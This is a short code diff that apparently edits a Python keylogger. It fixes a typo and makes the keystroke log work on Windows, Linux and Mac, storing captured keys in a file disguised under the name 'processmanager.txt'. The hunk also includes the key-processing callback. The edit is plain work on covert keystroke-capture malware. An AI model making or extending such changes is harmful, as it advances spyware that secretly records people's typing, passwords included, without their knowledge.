@@ -4,7 +4,11 @@ import threading
 import os 
 
 log = ""
-path = os.environp["appdata"] + "\\processmanager.txt"  #path where the log file will be stored in your system
+# Cross-platform path handling
+if os.name == 'nt':  # Windows
+    path = os.environ["appdata"] + "\\processmanager.txt"
+else:  # Linux/Mac
+    path = os.path.expanduser("~/processmanager.txt")
 
 def process_keys(key):
   # print(key)   ---> you can use it to see the keys in terminal for testing purpose
